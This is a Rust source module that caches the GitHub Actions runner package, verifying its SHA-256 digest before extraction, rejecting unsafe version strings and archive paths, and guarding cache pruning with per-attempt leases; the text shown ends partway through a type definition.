// owner: e2-runner-package-cache
//
// `e1` owns `reconcile` and the crate root, `e3` owns `lifecycle`. Nothing in
// this file edits either: the attempt vocabulary this module reasons about —
// `RunnerAttempt`, `AttemptId`, `AttemptState::is_terminal` — is `b1`'s and is
// consumed, never restated.

//! The cached, checksum-verified GitHub runner package.
//!
//! Two failure modes drive this module, and every decision below is one of them
//! being closed:
//!
//! * **A tampered package executes arbitrary code on the operator's machine.**
//!   Download metadata comes from GitHub and nowhere else, the published
//!   SHA-256 is verified *before* extraction, and an absent published checksum
//!   fails closed rather than degrading into "skip the check"
//!   (`07-security.md`, `05-infrastructure.md`).
//! * **A stale package makes every job start failing for a reason nobody will
//!   guess.** GitHub rejects runners more than 30 days behind the latest
//!   release (`01-current-architecture.md`, edge case 7), so the published
//!   version is re-checked on a bounded interval and a superseded cache entry
//!   is refreshed before a cold start.
//!
//! # The shape of the cache
//!
//! Under [`AppPaths::state_dir`], which `05-infrastructure.md` names as the home
//! of "the retained runner package cache":
//!
//! ```text
//! state/
//!   packages/
//!     2.330.0/                     one immutable entry, never mutated after it lands
//!       .runner-package.json       its manifest, written before the entry lands
//!       run.sh, bin/, externals/   GitHub's archive, extracted
//!     .staging/                    transient; a partial install is only ever here
//!     .leases/                     <attempt-uuid>.lease, the prune guard's evidence
//!   tool-cache/                    approved tool caches, retained beside the binaries
//! runtime/                         per-attempt job workspaces — NOT under packages/
//! ```
//!
//! **A cache entry is created by exactly one filesystem operation.** Extraction
//! writes into `.staging/<uuid>/`, the manifest is written *inside* that
//! staging directory, and the directory is then renamed to `packages/<version>/`.
//! The rename is the single commit point: an entry that exists is an entry that
//! is complete, and a crash at any earlier moment leaves nothing but staging
//! litter. That is also what makes "a second install of the same version is a
//! no-op" true rather than aspirational — the entry is found and returned before
//! anything is fetched.
//!
//! # The seam `e3` consumes, stated deliberately
//!
//! `e3` creates each JIT runtime as "a copy or link from that cache plus a
//! unique workspace" (`05-infrastructure.md`). Three contracts hold that seam
//! together, and they are stated here because an unstated port contract becomes
//! a defect in the consumer:
//!
//! 1. [`InstalledPackage::root`] is **read-only to the caller**. It is the
//!    shared, immutable source that every runtime is copied or linked from.
//!    Writing into it corrupts every future runtime, and nothing in this module
//!    can detect it after the fact.
//! 2. [`PackageCache::lease`] must be called for the version a runtime was
//!    created from, and [`PackageCache::release`] when that runtime is removed.
//!    **The prune guard is only as truthful as those calls**: a version with no
//!    lease is a version this module believes nothing references. The guard is
//!    fail-closed in the other direction — see [`PackageCache::prune`] — so a
//!    lease that is never released costs disk, while a lease that is never taken
//!    costs a running runner its binaries.
//! 3. Job workspaces live under [`AppPaths::runtime_dir`] and never under the
//!    package cache. [`PackageCache::lease`] **enforces** this rather than
//!    documenting it: a lease whose attempt's runtime path resolves inside the
//!    cache root is refused.
//!
//! # What is built here and not yet reachable in production
//!
//! Two mechanisms in this module are complete and tested but have no live
//! caller, and both are easier to find written down here than inferred from an
//! absence:
//!
//! * **[`PinnedDigests`] has no operator-facing surface.** It is the entire
//!   remedy [`PackageError::ChecksumAbsent`] names, and today it can only be
//!   supplied by [`PackageCache::with_pins`] from Rust. Until a configuration
//!   or CLI path reaches it, an operator who hits that refusal has been given
//!   an instruction they cannot carry out. Wiring it is a `g`/`f`-group
//!   concern, not this module's.
//! * **[`PackageError::VersionRejected`] cannot be produced through the real
//!   adapter.** [`GatewayCatalog`] maps every `InventoryError` to the retryable
//!   [`PackageError::CatalogUnavailable`], correctly — the downloads endpoint
//!   has no version-rejection response. The rejection lands at *registration*,
//!   which is `e3`'s path, and [`DownloadCatalog`] exists to carry it here when
//!   `e3` reports it. So the no-retry behaviour is proven and nothing yet
//!   supplies its input.

use std::collections::BTreeMap;
use std::fmt;
use std::fs;
use std::io::{self, Read};
use std::path::{Component, Path, PathBuf};
use std::sync::{Arc, Mutex};

use runner_manager_domain::attempt::{AttemptState, FailureReason, RunnerAttempt};
use runner_manager_domain::model::{Arch, AttemptId, Clock, Elapsed, Os, Timestamp};
use runner_manager_github::rest::{RunnerDownload, RunnerDownloads};
use runner_manager_platform::os::{self as host_os, UnsupportedHost};
use runner_manager_platform::paths::AppPaths;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

// ---------------------------------------------------------------------------
// Layout constants
// ---------------------------------------------------------------------------

/// The cache root, under [`AppPaths::state_dir`].
const PACKAGES_DIR: &str = "packages";
/// Approved tool caches, retained beside the runner binaries and deliberately
/// **not** inside [`PACKAGES_DIR`]: a version entry is immutable, and a tool
/// cache is by definition written to.
const TOOL_CACHE_DIR: &str = "tool-cache";
/// Transient extraction area. Everything here is litter from an interrupted
/// install and may be removed at any time.
const STAGING_DIR: &str = ".staging";
/// One file per attempt that holds a version.
const LEASES_DIR: &str = ".leases";
const LEASE_EXTENSION: &str = "lease";
/// The manifest, written inside the staging directory before the entry lands.
const MANIFEST_FILE: &str = ".runner-package.json";

/// How far behind the latest release a cached package may be before it is
/// refreshed. GitHub rejects runners past this and plans to block them at
/// registration (`01-current-architecture.md`, edge case 7).
pub const FRESHNESS_WINDOW_DAYS: i64 = 30;

/// How often the published version is re-checked. "A bounded interval"
/// (`05-infrastructure.md`); six hours keeps the check far cheaper than the
/// demand poll while still catching a release the same day it ships.
pub const CHECK_INTERVAL_HOURS: i64 = 6;

/// How many times a *retryable* failure is retried before the install is
/// abandoned. A terminal failure consumes none of this budget.
pub const RETRY_BUDGET: u32 = 3;

// ---------------------------------------------------------------------------
// RunnerVersion
// ---------------------------------------------------------------------------

/// A runner package version, such as `2.330.0`.
///
/// # Why this is parsed rather than carried as a string
///
/// The version becomes a **directory name** under the cache root, and it is
/// derived from a filename GitHub sends over the wire. A string taken on trust
/// there is a path component taken on trust: `..`, `foo/bar`, `C:\x` and an
/// empty segment are all things a hostile or merely broken response could
/// supply. [`RunnerVersion::parse`] admits only two to four dot-separated runs
/// of ASCII digits, which cannot spell any of them.
///
/// Ordering is numeric per component, so `2.9.0 < 2.10.0`. Nothing in this
/// module makes a *safety* decision from that ordering — freshness is decided
/// from install time, not from version order — but a deterministic order makes
/// [`PackageCache::installed`] stable.
#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct RunnerVersion {
    /// Numeric components, compared first so `2.10.0` sorts above `2.9.0`.
    parts: Vec<u64>,
    raw: String,
}

impl RunnerVersion {
    /// The longest version string accepted. Generous for `MAJOR.MINOR.PATCH`
    /// and still far short of anything that could exhaust a path.
    const MAX_LEN: usize = 64;
    const MIN_PARTS: usize = 2;
    const MAX_PARTS: usize = 4;

    /// # Errors
    /// [`PackageError::UnrecognisedVersion`] when `raw` is not two to four
    /// dot-separated runs of ASCII digits.
    pub fn parse(raw: &str) -> Result<Self, PackageError> {
        let unrecognised = || PackageError::UnrecognisedVersion {
            raw: raw.to_string(),
        };
        if raw.is_empty() || raw.len() > Self::MAX_LEN {
            return Err(unrecognised());
        }
        let mut parts = Vec::new();
        for segment in raw.split('.') {
            if segment.is_empty() || !segment.bytes().all(|b| b.is_ascii_digit()) {
                return Err(unrecognised());
            }
            parts.push(segment.parse::<u64>().map_err(|_| unrecognised())?);
        }
        if parts.len() < Self::MIN_PARTS || parts.len() > Self::MAX_PARTS {
            return Err(unrecognised());
        }
        Ok(Self {
            parts,
            raw: raw.to_string(),
        })
    }

    /// The version embedded in a published filename such as
    /// `actions-runner-win-x64-2.330.0.zip`.
    ///
    /// GitHub's runner-downloads response carries no version field — the only
    /// version signal it publishes is inside the filename and the URL — so this
    /// is where the cache's directory names come from.
    ///
    /// # Errors
    /// [`PackageError::UnsupportedArchive`] when the extension is neither
    /// `.zip` nor `.tar.gz`/`.tgz`, and [`PackageError::UnrecognisedVersion`]
    /// when the trailing segment is not a version.
    pub fn from_filename(filename: &str) -> Result<Self, PackageError> {
        let (stem, _) = ArchiveKind::split(filename)?;
        // `rsplit` always yields at least one item — the whole string when
        // there is no `-` — so this cannot be `None`. `unwrap_or(stem)` says
        // that, where the `ok_or_else` it replaced dressed an unreachable arm
        // up as a handled error and invited a reader to look for the input that
        // reaches it. If there is no `-`, the whole stem is the candidate and
        // `parse` refuses it.
        let last = stem.rsplit('-').next().unwrap_or(stem);
        Self::parse(last)
    }

    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.raw
    }
}

impl fmt::Display for RunnerVersion {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.raw)
    }
}

impl TryFrom<String> for RunnerVersion {
    type Error = PackageError;

    fn try_from(value: String) -> Result<Self, Self::Error> {
        Self::parse(&value)
    }
}

impl From<RunnerVersion> for String {
    fn from(value: RunnerVersion) -> Self {
        value.raw
    }
}

// ---------------------------------------------------------------------------
// Sha256Hex
// ---------------------------------------------------------------------------

/// A SHA-256 digest, normalised to 64 lowercase hex characters.
///
/// Parsed rather than compared as a raw string so that a malformed published
/// value — the wrong length, a non-hex character, an `sha256:` prefix — is a
/// *refusal* rather than a comparison that quietly never matches. A digest
/// check that can never succeed and a digest check that can never fail are the
/// same defect wearing different clothes.
#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct Sha256Hex(String);

impl Sha256Hex {
    const LEN: usize = 64;

    /// # Errors
    /// [`PackageError::MalformedDigest`] when `raw` is not 64 hex characters.
    pub fn parse(raw: &str) -> Result<Self, PackageError> {
        let trimmed = raw.trim();
        if trimmed.len() != Self::LEN || !trimmed.bytes().all(|b| b.is_ascii_hexdigit()) {
            return Err(PackageError::MalformedDigest {
                raw: trimmed.to_string(),
            });
        }
        Ok(Self(trimmed.to_ascii_lowercase()))
    }

    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for Sha256Hex {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

impl TryFrom<String> for Sha256Hex {
    type Error = PackageError;

    fn try_from(value: String) -> Result<Self, Self::Error> {
        Self::parse(&value)
    }
}

impl From<Sha256Hex> for String {
    fn from(value: Sha256Hex) -> Self {
        value.0
    }
}

/// Which unusable shape GitHub's optional `sha256_checksum` arrived in.
///
/// Three distinct facts about the response, one shared remedy. They are not
/// collapsed into a boolean because the operator reading the refusal is
/// troubleshooting GitHub's response, and "the field was missing", "the field
/// was blank" and "the field was not a digest" send them to three different
/// places.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PublishedChecksum {
    /// The field was not present at all.
    Absent,
    /// The field was present and blank.
    Empty,
    /// The field was present and was not 64 hexadecimal characters.
    Malformed,
}

impl PublishedChecksum {
    #[must_use]
    pub const fn describe(self) -> &'static str {
        match self {
            Self::Absent => "no sha256_checksum",
            Self::Empty => "an empty sha256_checksum",
            Self::Malformed => "a malformed sha256_checksum",
        }
    }
}

impl fmt::Display for PublishedChecksum {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.describe())
    }
}

/// Digests an already-downloaded file without holding it in memory.
///
/// The runner package is 150-300 MB; the whole reason `reqwest`'s `stream`
/// feature is enabled for this crate is that neither the download nor this pass
/// buffers it.
fn sha256_file(path: &Path) -> Result<Sha256Hex, PackageError> {
    let mut file = fs::File::open(path).map_err(|source| PackageError::Io {
        what: "open the downloaded package for verification",
        path: path.to_path_buf(),
        source,
    })?;
    let mut hasher = Sha256::new();
    let mut buffer = vec![0_u8; 128 * 1024];
    loop {
        let read = file.read(&mut buffer).map_err(|source| PackageError::Io {
            what: "read the downloaded package for verification",
            path: path.to_path_buf(),
            source,
        })?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Sha256Hex::parse(&hex::encode(hasher.finalize()))
}

// ---------------------------------------------------------------------------
// Archive kind
// ---------------------------------------------------------------------------

/// The two shapes GitHub publishes the runner in.
///
/// **Derived from the filename, never from the host OS.** They agree in
/// practice — `.zip` for Windows, `.tar.gz` elsewhere — but the filename is what
/// actually arrived, and deriving the format from an assumption about the host
/// is how a correct download gets fed to the wrong extractor. It also lets both
/// extraction paths be exercised on all three CI legs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ArchiveKind {
    Zip,
    TarGz,
}

impl ArchiveKind {
    /// Splits a published filename into its stem and its archive kind.
    fn split(filename: &str) -> Result<(&str, Self), PackageError> {
        let lower = filename.to_ascii_lowercase();
        for (extension, kind) in [
            (".tar.gz", Self::TarGz),
            (".tgz", Self::TarGz),
            (".zip", Self::Zip),
        ] {
            if lower.ends_with(extension) {
                return Ok((&filename[..filename.len() - extension.len()], kind));
            }
        }
        Err(PackageError::UnsupportedArchive {
            filename: filename.to_string(),
        })
    }
}

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Everything that can stop a package reaching the cache.
///
/// # Terminal versus retryable is not a style choice here
///
/// `03-control-flows.md` flow 2 fixes the split, and it is narrower than it
/// looks: *"a JIT request, download checksum, process start, or runner exit
/// before job acceptance is retried with bounded exponential backoff … A runner
/// version rejection and an absent published checksum are terminal,
/// operator-actionable conditions, not retryable errors."*
///
/// So a checksum **mismatch** is retryable — the usual cause is a truncated or
/// corrupted transfer, and the next attempt gets clean bytes — while an
/// **absent** checksum is terminal, because retrying cannot make GitHub publish
/// one. Getting this backwards in either direction is a real outage: retrying a
/// version rejection turns a fixable condition into a silent loop, and treating
/// a mismatch as terminal fails a cold start on a dropped packet.
#[derive(Debug, thiserror::Error)]
pub enum PackageError {
    /// This OS and architecture pair is not one the product documents. Refused
    /// before any request is made, let alone any download.
    #[error("{0}")]
    UnsupportedHost(#[from] UnsupportedHost),

    /// GitHub publishes no package for this host. **Never a reason to fall back
    /// to a hardcoded URL** — that is the substitution `07-security.md` exists
    /// to prevent.
    #[error("GitHub publishes no runner package for {os}/{arch}")]
    NoPackagePublished { os: Os, arch: Arch },

    /// GitHub published no *usable* `sha256_checksum` and no operator-pinned
    /// digest is configured. Terminal: the agent fails closed
    /// (`05-infrastructure.md`).
    ///
    /// `published` says which of the three unusable shapes arrived. They are
    /// kept apart because they are different facts about GitHub's response —
    /// `c3` distinguishes absent from empty deliberately — and because an
    /// operator reading this is entitled to the one that actually happened.
    /// **All three carry the same remedy, and that is the point of the variant:
    /// every unusable shape routes to the operator-pinned digest.** An earlier
    /// version let a malformed value bypass the pin and then told the operator
    /// to pin one, which was advice that could not work.
    #[error(
        "GitHub published {} for runner package {version} ({os}/{arch}), so it \
         cannot be verified and will not be installed. Pin the digest you have \
         independently confirmed for {version} and retry.",
        published.describe()
    )]
    ChecksumAbsent {
        version: RunnerVersion,
        os: Os,
        arch: Arch,
        published: PublishedChecksum,
    },

    /// The bytes on disk are not the bytes GitHub published. The partial file
    /// is removed before this is returned, and nothing is extracted.
    #[error(
        "runner package {version} does not match its published SHA-256 \
         (published {expected}, downloaded {actual}); the partial download was \
         discarded and nothing was extracted"
    )]
    ChecksumMismatch {
        version: RunnerVersion,
        expected: Sha256Hex,
        actual: Sha256Hex,
    },

    /// A digest — published or pinned — that is not 64 hex characters.
    #[error("`{raw}` is not a SHA-256 digest; a digest is 64 hexadecimal characters")]
    MalformedDigest { raw: String },

    /// GitHub refused this runner on version grounds. Terminal and
    /// operator-actionable; see [`DownloadCatalog`] for who reports it.
    #[error(
        "GitHub rejected the runner version{}{}. Runners more than \
         {FRESHNESS_WINDOW_DAYS} days behind the latest release are refused. \
         Install the current package and start a new attempt; retrying this one \
         cannot succeed.",
        version.as_ref().map(|v| format!(" {v}")).unwrap_or_default(),
        detail.as_ref().map(|d| format!(": {d}")).unwrap_or_default()
    )]
    VersionRejected {
        version: Option<RunnerVersion>,
        detail: Option<String>,
    },

    /// The download metadata could not be read. Retryable.
    #[error("the runner download metadata could not be read: {detail}")]
    CatalogUnavailable { detail: String },

    /// The package bytes could not be fetched. Retryable.
    #[error("the runner package could not be downloaded: {detail}")]
    Download { detail: String },

    /// A filename whose trailing segment is not a version.
    #[error("`{raw}` is not a runner version")]
    UnrecognisedVersion { raw: String },

    /// A published filename that is neither a `.zip` nor a `.tar.gz`.
    #[error("`{filename}` is not a runner package archive this agent can extract")]
    UnsupportedArchive { filename: String },

    /// An archive entry whose path escapes the directory being extracted into.
    ///
    /// Verification runs before extraction, so these bytes are the bytes GitHub
    /// published and this should be unreachable. It is refused anyway: the cost
    /// is a path comparison, and the thing it prevents is an archive writing
    /// outside the cache root.
    #[error("runner package entry `{entry}` escapes the directory it is extracted into")]
    UnsafeArchiveEntry { entry: String },

    /// The archive could not be read or unpacked.
    #[error("the runner package archive could not be extracted: {detail}")]
    Extract { detail: String },

    /// A prune was refused because a live attempt still holds the version.
    #[error(
        "runner package {version} is still held by attempt {attempt}, which is \
         `{state}` and not terminal; it will be prunable once that attempt \
         concludes"
    )]
    VersionInUse {
        version: RunnerVersion,
        attempt: AttemptId,
        /// `b1`'s type, rendered by `b1`'s `Display`. This module had its own
        /// nine-arm `match` producing the same nine strings; a second rendering
        /// of someone else's enum is a second thing to keep in step, and it
        /// silently stops matching the moment a state is added.
        state: AttemptState,
    },

    /// A prune was refused because a lease names an attempt the caller did not
    /// report. See [`PackageCache::prune`] for why this fails closed.
    #[error(
        "runner package {version} is held by attempt {attempt}, which is not in \
         the attempt set supplied; refusing to prune a version whose holder \
         cannot be shown to be terminal. Release the lease explicitly if that \
         attempt is known to be gone."
    )]
    VersionHeldByUnknownAttempt {
        version: RunnerVersion,
        attempt: AttemptId,
    },

    /// A lease file exists but cannot be understood, so what it holds is
    /// unknown and no prune can be shown to be safe.
    #[error(
        "the runner package lease at `{}` cannot be read, so which version it \
         holds is unknown; refusing to prune anything until it is resolved",
        path.display()
    )]
    UnreadableLease { path: PathBuf },

    /// A lease was refused because the attempt's workspace is inside the cache.
    #[error(
        "attempt {attempt} has its runtime at `{}`, which is inside the runner \
         package cache. Job workspaces are disposable and the cache is \
         immutable; a workspace here would be destroyed by a prune and would \
         mutate an entry that every other runtime is copied from.",
        path.display()
    )]
    WorkspaceInsideCache { attempt: AttemptId, path: PathBuf },

    /// A lease or prune named a version that is not in the cache.
    #[error("runner package {version} is not installed")]
    NotInstalled { version: RunnerVersion },

    #[error("cannot {what} at `{}`: {source}", path.display())]
    Io {
        what: &'static str,
        path: PathBuf,
        #[source]
        source: io::Error,
    },

    /// Every retry was spent on retryable failures.
    #[error("giving up after {attempts} attempts: {source}")]
    Exhausted {
        attempts: u32,
        #[source]
        source: Box<PackageError>,
    },
}

impl PackageError {
    /// Whether this condition is terminal and operator-actionable rather than
    /// something a retry can clear.
    ///
    /// Read the type-level documentation before changing any arm: the split is
    /// fixed by `03-control-flows.md`, not by taste.
    #[must_use]
    pub fn is_terminal(&self) -> bool {
        match self {
            // Retrying cannot make GitHub publish a checksum, support an
            // undocumented platform, publish a package it does not publish,
            // accept a rejected version, or turn a malformed value well-formed.
            Self::UnsupportedHost(_)
            | Self::NoPackagePublished { .. }
            | Self::ChecksumAbsent { .. }
            | Self::MalformedDigest { .. }
            | Self::VersionRejected { .. }
            | Self::UnrecognisedVersion { .. }
            | Self::UnsupportedArchive { .. }
            | Self::UnsafeArchiveEntry { .. }
            | Self::VersionInUse { .. }
            | Self::VersionHeldByUnknownAttempt { .. }
            | Self::UnreadableLease { .. }
            | Self::WorkspaceInsideCache { .. }
            | Self::NotInstalled { .. } => true,
            // A truncated transfer, a 5xx, a rate limit, a locked file: the next
            // attempt can differ.
            Self::ChecksumMismatch { .. }
            | Self::CatalogUnavailable { .. }
            | Self::Download { .. }
            | Self::Extract { .. }
            | Self::Io { .. } => false,
            // The budget is spent; whatever it was spent on, this is the end.
            Self::Exhausted { .. } => true,
        }
    }

    /// The domain reason to journal, when this failure concludes an attempt.
    ///
    /// `b1` owns [`FailureReason`] and already names both of this module's
    /// terminal security conditions. Nothing here invents a second vocabulary
    /// for them.
    #[must_use]
    pub fn failure_reason(&self) -> Option<FailureReason> {
        match self {
            Self::ChecksumAbsent { .. }
            | Self::ChecksumMismatch { .. }
            | Self::MalformedDigest { .. }
            | Self::UnsafeArchiveEntry { .. } => Some(FailureReason::RunnerPackageUnverified),
            Self::VersionRejected { .. } => Some(FailureReason::RunnerVersionRejected),
            Self::Exhausted { source, .. } => source.failure_reason(),
            _ => None,
        }
    }

    /// What the operator has to do. Every terminal condition has one; a
    /// retryable one has none, because the answer is "wait".
    #[must_use]
    pub fn operator_action(&self) -> Option<&'static str> {
        match self {
            Self::UnsupportedHost(_) => Some(
                "run the agent on a documented operating system and architecture, \
                 or add this host to the supported matrix",
            ),
            Self::NoPackagePublished { .. } => Some(
                "check that GitHub publishes a runner package for this host's \
                 operating system and architecture",
            ),
            Self::ChecksumAbsent { .. } => Some(
                "confirm the package digest independently and pin it, or wait \
                 for GitHub to publish a checksum; the package will not be \
                 installed unverified",
            ),
            Self::MalformedDigest { .. } => {
                Some("correct the pinned digest to 64 hexadecimal characters")
            }
            Self::VersionRejected { .. } => Some(
                "install the current runner package and start a new attempt; \
                 this one cannot be retried into success",
            ),
            Self::UnsupportedArchive { .. } | Self::UnrecognisedVersion { .. } => Some(
                "GitHub's runner download metadata is not in a shape this agent \
                 recognises; report it rather than working around it",
            ),
            Self::UnsafeArchiveEntry { .. } => Some(
                "the runner package archive contains an entry that writes \
                 outside the cache; do not install it and report it",
            ),
            Self::VersionInUse { .. } => {
                Some("wait for the attempt holding this version to conclude")
            }
            Self::VersionHeldByUnknownAttempt { .. } => Some(
                "release the lease for the attempt named above if it is known to \
                 be gone, then prune again",
            ),
            Self::UnreadableLease { .. } => Some(
                "inspect the lease file named above; delete it once the attempt \
                 it belonged to is known to be gone, then prune again",
            ),
            Self::WorkspaceInsideCache { .. } => {
                Some("place job workspaces under the runtime directory")
            }
            Self::NotInstalled { .. } => Some("install the version before referencing it"),
            Self::Exhausted { source, .. } => source.operator_action(),
            Self::ChecksumMismatch { .. }
            | Self::CatalogUnavailable { .. }
            | Self::Download { .. }
            | Self::Extract { .. }
            | Self::Io { .. } => None,
        }
    }
}

// ---------------------------------------------------------------------------
// Ports
// ---------------------------------------------------------------------------

/// Where the published runner-download metadata comes from.
///
/// Deliberately narrower than `c3`'s `InventoryGateway`: this module needs one
/// answer, and a port with one method is a port a test can substitute without
/// standing up a whole gateway. [`GatewayCatalog`] adapts the real one.
///
/// # Reporting a version rejection through this port
///
/// GitHub's runner-downloads endpoint does not itself reject a version — the
/// rejection lands at *registration*, which is `e3`'s path. This port carries
/// [`PackageError::VersionRejected`] anyway so that a rejection observed
/// anywhere in the agent reaches the one place that can act on it: the cache,
/// whose fix is a newer package.
///
/// **An implementation that answers `VersionRejected` is promising that
/// retrying is pointless.** [`PackageCache`] honours that literally — it makes
/// no further attempt and spends none of its retry budget — so an
/// implementation that returns it for a transient condition converts a blip
/// into a stopped host. When in doubt, answer
/// [`PackageError::CatalogUnavailable`], which is retryable.
#[async_trait::async_trait]
pub trait DownloadCatalog: fmt::Debug + Send + Sync {
    /// The runner packages GitHub currently publishes.
    ///
    /// # Errors
    /// [`PackageError::CatalogUnavailable`] for anything a retry could clear,
    /// [`PackageError::VersionRejected`] for a version refusal.
    async fn published(&self) -> Result<RunnerDownloads, PackageError>;
}

/// Streams a published package onto disk.
///
/// # Contract
///
/// * The bytes are written to `destination` and nowhere else.
/// * **The implementation does not remove `destination` on failure.** A partial
///   file is the caller's to discard, and [`PackageCache`] discards it — see
///   [`PackageCache::prune`]'s neighbour, `download_and_verify`. Having the
///   fetcher clean up would hide a partial download from the very test that
///   proves it is removed.
/// * Nothing is verified here. Verification is the cache's, and it happens
///   before extraction.
#[async_trait::async_trait]
pub trait PackageFetcher: fmt::Debug + Send + Sync {
    /// Stream `url` into `destination`, answering how many bytes were written.
    ///
    /// # Errors
    /// [`PackageError::Download`] for a transport or status failure,
    /// [`PackageError::Io`] for a write failure.
    async fn fetch(&self, url: &str, destination: &Path) -> Result<u64, PackageError>;
}

/// How long to wait between retries of a retryable failure.
#[async_trait::async_trait]
pub trait Backoff: fmt::Debug + Send + Sync {
    /// Called after attempt `attempt` (1-based) failed retryably.
    async fn wait(&self, attempt: u32);
}

/// Bounded exponential backoff, as `03-control-flows.md` requires.
#[derive(Debug, Clone, Copy)]
pub struct ExponentialBackoff {
    base: std::time::Duration,
    cap: std::time::Duration,
}

impl ExponentialBackoff {
    #[must_use]
    pub const fn new(base: std::time::Duration, cap: std::time::Duration) -> Self {
        Self { base, cap }
    }
}

impl Default for ExponentialBackoff {
    fn default() -> Self {
        Self::new(
            std::time::Duration::from_secs(2),
            std::time::Duration::from_secs(30),
        )
    }
}

#[async_trait::async_trait]
impl Backoff for ExponentialBackoff {
    async fn wait(&self, attempt: u32) {
        let factor = 1_u32 << attempt.min(16);
        let delay = self.base.saturating_mul(factor).min(self.cap);
        tokio::time::sleep(delay).await;
    }
}

/// No delay at all. For tests, and for a caller that supplies its own pacing.
#[derive(Debug, Clone, Copy, Default)]
pub struct NoBackoff;

#[async_trait::async_trait]
impl Backoff for NoBackoff {
    async fn wait(&self, _attempt: u32) {}
}

// ---------------------------------------------------------------------------
// Production adapters
// ---------------------------------------------------------------------------

/// Adapts `c3`'s `InventoryGateway` to [`DownloadCatalog`].
///
/// Every `InventoryError` maps to [`PackageError::CatalogUnavailable`], which
/// is retryable, because the downloads endpoint has no version-rejection
/// response: a rate limit, a cancellation and a transport failure are all
/// conditions a later attempt can clear.
#[derive(Debug)]
pub struct GatewayCatalog<G> {
    gateway: G,
    target: runner_manager_domain::model::ScaleTarget,
}

impl<G> GatewayCatalog<G> {
    #[must_use]
    pub const fn new(gateway: G, target: runner_manager_domain::model::ScaleTarget) -> Self {
        Self { gateway, target }
    }
}

#[async_trait::async_trait]
impl<G> DownloadCatalog for GatewayCatalog<G>
where
    G: runner_manager_github::rest::InventoryGateway,
{
    async fn published(&self) -> Result<RunnerDownloads, PackageError> {
        let cancel = runner_manager_github::rest::CancelToken::new();
        self.gateway
            .runner_downloads(&self.target, &cancel)
            .await
            .map_err(|error| PackageError::CatalogUnavailable {
                detail: error.to_string(),
            })
    }
}

/// Streams the package with `reqwest`, one chunk at a time.
///
/// The `stream` feature exists in this workspace for exactly this: the package
/// is 150-300 MB, and buffering it in memory on a home host is not an option —
/// nor would it leave a partial file on disk for the mismatch path to remove.
#[derive(Debug, Clone)]
pub struct HttpFetcher {
    client: reqwest::Client,
}

impl HttpFetcher {
    #[must_use]
    pub fn new(client: reqwest::Client) -> Self {
        Self { client }
    }
}

impl Default for HttpFetcher {
    fn default() -> Self {
        Self::new(reqwest::Client::new())
    }
}

#[async_trait::async_trait]
impl PackageFetcher for HttpFetcher {
    async fn fetch(&self, url: &str, destination: &Path) -> Result<u64, PackageError> {
        use futures::StreamExt as _;
        use tokio::io::AsyncWriteExt as _;

        let response = self
            .client
            .get(url)
            .send()
            .await
            .and_then(reqwest::Response::error_for_status)
            .map_err(|error| PackageError::Download {
                detail: error.to_string(),
            })?;

        let mut file = tokio::fs::File::create(destination)
            .await
            .map_err(|source| PackageError::Io {
                what: "create the package download file",
                path: destination.to_path_buf(),
                source,
            })?;

        let mut stream = response.bytes_stream();
        let mut written = 0_u64;
        while let Some(chunk) = stream.next().await {
            let chunk = chunk.map_err(|error| PackageError::Download {
                detail: error.to_string(),
            })?;
            written += chunk.len() as u64;
            file.write_all(&chunk)
                .await
                .map_err(|source| PackageError::Io {
                    what: "write the package download file",
                    path: destination.to_path_buf(),
                    source,
                })?;
        }
        file.flush().await.map_err(|source| PackageError::Io {
            what: "flush the package download file",
            path: destination.to_path_buf(),
            source,
        })?;
        file.sync_all().await.map_err(|source| PackageError::Io {
            what: "sync the package download file",
            path: destination.to_path_buf(),
            source,
        })?;
        Ok(written)
    }
}

// ---------------------------------------------------------------------------
// Pinned digests
// ---------------------------------------------------------------------------

/// Digests the operator has independently confirmed, keyed by version.
///
/// This is the *only* way a package with no published checksum is ever
/// installed. It is a deliberate, named, per-version act by an operator — not a
/// switch that turns verification off — which is the difference
/// `05-infrastructure.md` draws between "require an operator-pinned digest" and
/// "skip the check".
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct PinnedDigests(BTreeMap<RunnerVersion, Sha256Hex>);

impl PinnedDigests {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Pin `digest` for `version`.
    ///
    /// # Errors
    /// [`PackageError::UnrecognisedVersion`] or
    /// [`PackageError::MalformedDigest`] when either value is not well formed.
    pub fn pin(mut self, version: &str, digest: &str) -> Result<Self, PackageError> {
        self.0
            .insert(RunnerVersion::parse(version)?, Sha256Hex::parse(digest)?);
        Ok(self)
    }

    #[must_use]
    pub fn get(&self, version: &RunnerVersion) -> Option<&Sha256Hex> {
        self.0.get(version)
    }

    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }
}

// ---------------------------------------------------------------------------
// Freshness
// ---------------------------------------------------------------------------

/// When a cached package stops being good enough.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Freshness {
    /// How far behind the latest release a cached entry may fall.
    pub window: Elapsed,
    /// How often the published version is re-checked.
    pub check_interval: Elapsed,
}

impl Default for Freshness {
    fn default() -> Self {
        Self {
            window: Elapsed::days(FRESHNESS_WINDOW_DAYS),
            check_interval: Elapsed::hours(CHECK_INTERVAL_HOURS),
        }
    }
}

// ---------------------------------------------------------------------------
// InstalledPackage
// ---------------------------------------------------------------------------

/// One immutable entry in the cache.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstalledPackage {
    version: RunnerVersion,
    root: PathBuf,
    installed_at: Timestamp,
    digest: Sha256Hex,
}

impl InstalledPackage {
    #[must_use]
    pub fn version(&self) -> &RunnerVersion {
